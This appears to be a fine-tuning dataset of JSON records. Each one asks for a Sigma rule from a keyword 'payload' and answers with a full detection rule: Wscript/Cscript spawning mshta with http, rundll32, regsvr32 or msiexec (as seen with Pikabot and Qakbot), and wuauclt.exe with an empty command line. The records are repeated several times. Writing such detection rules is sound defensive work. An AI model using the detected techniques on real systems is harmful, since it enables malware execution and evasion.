{"instruction": "Write Sigma rule to detect payload:", "input": "\\wscript.exe \\cscript.exe \\cmd.exe \\powershell.exe \\pwsh.exe mshta http rundll32 regsvr32 msiexec \\rundll32.exe \\rundll32.exe UpdatePerUserSystemParameters PrintUIEntry \"ClearMyTracksByProcess\"", "output": "title: Cscript/Wscript Potentially Suspicious Child Process\nid: b6676963-0353-4f88-90f5-36c20d443c6a\nstatus: test\ndescription: |\n    Detects potentially suspicious child processes of Wscript/Cscript. These include processes such as rundll32 with uncommon exports or PowerShell spawning rundll32 or regsvr32.\n    Malware such as Pikabot and Qakbot were seen using similar techniques as well as many others.\nreferences:\n    - Internal Research\n    - https://github.com/pr0xylife/Pikabot/blob/fc58126127adf0f65e78f4eec59675523f48f086/Pikabot_30.10.2023.txt\n    - https://github.com/pr0xylife/Pikabot/blob/fc58126127adf0f65e78f4eec59675523f48f086/Pikabot_22.12.2023.txt\nauthor: Nasreddine Bencherchali (Nextron Systems), Alejandro Houspanossian ('@lekz86')\ndate: 2023-05-15\nmodified: 2024-01-02\ntags:\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith:\n            - '\\wscript.exe'\n            - '\\cscript.exe'\n    selection_cli_script_main:\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n    # Note: Add other combinations that are suspicious\n    selection_cli_script_option_mshta:\n        CommandLine|contains|all:\n            - 'mshta'\n            - 'http'\n    selection_cli_script_option_other:\n        CommandLine|contains:\n            - 'rundll32'\n            - 'regsvr32'\n            - 'msiexec'\n    selection_cli_standalone:\n        Image|endswith: '\\rundll32.exe'\n    filter_main_rundll32_known_exports:\n        Image|endswith: '\\rundll32.exe'\n        CommandLine|contains:\n            - 'UpdatePerUserSystemParameters'\n            - 'PrintUIEntry'\n            - 'ClearMyTracksByProcess'\n    condition: selection_parent and ( selection_cli_standalone or (selection_cli_script_main and 1 of selection_cli_script_option_*) ) and not 1 of filter_main_*\nfalsepositives:\n    - Some false positives might occur with admin or third party software scripts. Investigate and apply additional filters accordingly.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wscript \\cscript \\cmd \\powershell \\pwsh mshta http rundll32 regsvr32 msiexec \\rundll32 \\rundll32 UpdatePerUserSystemParameters PrintUIEntry ClearMyTracksByProcess", "output": "title: Cscript/Wscript Potentially Suspicious Child Process\nid: b6676963-0353-4f88-90f5-36c20d443c6a\nstatus: test\ndescription: |\n    Detects potentially suspicious child processes of Wscript/Cscript. These include processes such as rundll32 with uncommon exports or PowerShell spawning rundll32 or regsvr32.\n    Malware such as Pikabot and Qakbot were seen using similar techniques as well as many others.\nreferences:\n    - Internal Research\n    - https://github.com/pr0xylife/Pikabot/blob/fc58126127adf0f65e78f4eec59675523f48f086/Pikabot_30.10.2023.txt\n    - https://github.com/pr0xylife/Pikabot/blob/fc58126127adf0f65e78f4eec59675523f48f086/Pikabot_22.12.2023.txt\nauthor: Nasreddine Bencherchali (Nextron Systems), Alejandro Houspanossian ('@lekz86')\ndate: 2023-05-15\nmodified: 2024-01-02\ntags:\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith:\n            - '\\wscript.exe'\n            - '\\cscript.exe'\n    selection_cli_script_main:\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n    # Note: Add other combinations that are suspicious\n    selection_cli_script_option_mshta:\n        CommandLine|contains|all:\n            - 'mshta'\n            - 'http'\n    selection_cli_script_option_other:\n        CommandLine|contains:\n            - 'rundll32'\n            - 'regsvr32'\n            - 'msiexec'\n    selection_cli_standalone:\n        Image|endswith: '\\rundll32.exe'\n    filter_main_rundll32_known_exports:\n        Image|endswith: '\\rundll32.exe'\n        CommandLine|contains:\n            - 'UpdatePerUserSystemParameters'\n            - 'PrintUIEntry'\n            - 'ClearMyTracksByProcess'\n    condition: selection_parent and ( selection_cli_standalone or (selection_cli_script_main and 1 of selection_cli_script_option_*) ) and not 1 of filter_main_*\nfalsepositives:\n    - Some false positives might occur with admin or third party software scripts. Investigate and apply additional filters accordingly.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wscript.exe \\cscript.exe \\cmd.exe \\powershell.exe \\pwsh.exe mshta http rundll32 regsvr32 msiexec \\rundll32.exe \\rundll32.exe UpdatePerUserSystemParameters PrintUIEntry ClearMyTracksByProcess", "output": "title: Cscript/Wscript Potentially Suspicious Child Process\nid: b6676963-0353-4f88-90f5-36c20d443c6a\nstatus: test\ndescription: |\n    Detects potentially suspicious child processes of Wscript/Cscript. These include processes such as rundll32 with uncommon exports or PowerShell spawning rundll32 or regsvr32.\n    Malware such as Pikabot and Qakbot were seen using similar techniques as well as many others.\nreferences:\n    - Internal Research\n    - https://github.com/pr0xylife/Pikabot/blob/fc58126127adf0f65e78f4eec59675523f48f086/Pikabot_30.10.2023.txt\n    - https://github.com/pr0xylife/Pikabot/blob/fc58126127adf0f65e78f4eec59675523f48f086/Pikabot_22.12.2023.txt\nauthor: Nasreddine Bencherchali (Nextron Systems), Alejandro Houspanossian ('@lekz86')\ndate: 2023-05-15\nmodified: 2024-01-02\ntags:\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith:\n            - '\\wscript.exe'\n            - '\\cscript.exe'\n    selection_cli_script_main:\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n    # Note: Add other combinations that are suspicious\n    selection_cli_script_option_mshta:\n        CommandLine|contains|all:\n            - 'mshta'\n            - 'http'\n    selection_cli_script_option_other:\n        CommandLine|contains:\n            - 'rundll32'\n            - 'regsvr32'\n            - 'msiexec'\n    selection_cli_standalone:\n        Image|endswith: '\\rundll32.exe'\n    filter_main_rundll32_known_exports:\n        Image|endswith: '\\rundll32.exe'\n        CommandLine|contains:\n            - 'UpdatePerUserSystemParameters'\n            - 'PrintUIEntry'\n            - 'ClearMyTracksByProcess'\n    condition: selection_parent and ( selection_cli_standalone or (selection_cli_script_main and 1 of selection_cli_script_option_*) ) and not 1 of filter_main_*\nfalsepositives:\n    - Some false positives might occur with admin or third party software scripts. Investigate and apply additional filters accordingly.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\Wuauclt.exe Wuauclt.exe", "output": "title: Suspicious Windows Update Agent Empty Cmdline\nid: 52d097e2-063e-4c9c-8fbb-855c8948d135\nstatus: test\ndescription: |\n    Detects suspicious Windows Update Agent activity in which a wuauclt.exe process command line doesn't contain any command line flags\nreferences:\n    - https://redcanary.com/blog/blackbyte-ransomware/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-02-26\nmodified: 2023-11-11\ntags:\n    - attack.defense-evasion\n    - attack.t1036\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\Wuauclt.exe'\n        - OriginalFileName: 'Wuauclt.exe'\n    selection_cli:\n        CommandLine|endswith:\n            - 'Wuauclt'\n            - 'Wuauclt.exe'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"\\Wuauclt.exe\\\" Wuauclt.exe", "output": "title: Suspicious Windows Update Agent Empty Cmdline\nid: 52d097e2-063e-4c9c-8fbb-855c8948d135\nstatus: test\ndescription: |\n    Detects suspicious Windows Update Agent activity in which a wuauclt.exe process command line doesn't contain any command line flags\nreferences:\n    - https://redcanary.com/blog/blackbyte-ransomware/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-02-26\nmodified: 2023-11-11\ntags:\n    - attack.defense-evasion\n    - attack.t1036\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\Wuauclt.exe'\n        - OriginalFileName: 'Wuauclt.exe'\n    selection_cli:\n        CommandLine|endswith:\n            - 'Wuauclt'\n            - 'Wuauclt.exe'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\Wuauclt Wuauclt", "output": "title: Suspicious Windows Update Agent Empty Cmdline\nid: 52d097e2-063e-4c9c-8fbb-855c8948d135\nstatus: test\ndescription: |\n    Detects suspicious Windows Update Agent activity in which a wuauclt.exe process command line doesn't contain any command line flags\nreferences:\n    - https://redcanary.com/blog/blackbyte-ransomware/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-02-26\nmodified: 2023-11-11\ntags:\n    - attack.defense-evasion\n    - attack.t1036\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\Wuauclt.exe'\n        - OriginalFileName: 'Wuauclt.exe'\n    selection_cli:\n        CommandLine|endswith:\n            - 'Wuauclt'\n            - 'Wuauclt.exe'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\Wuauclt.exe Wuauclt.exe", "output": "title: Suspicious Windows Update Agent Empty Cmdline\nid: 52d097e2-063e-4c9c-8fbb-855c8948d135\nstatus: test\ndescription: |\n    Detects suspicious Windows Update Agent activity in which a wuauclt.exe process command line doesn't contain any command line flags\nreferences:\n    - https://redcanary.com/blog/blackbyte-ransomware/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-02-26\nmodified: 2023-11-11\ntags:\n    - attack.defense-evasion\n    - attack.t1036\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\Wuauclt.exe'\n        - OriginalFileName: 'Wuauclt.exe'\n    selection_cli:\n        CommandLine|endswith:\n            - 'Wuauclt'\n            - 'Wuauclt.exe'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: high"}
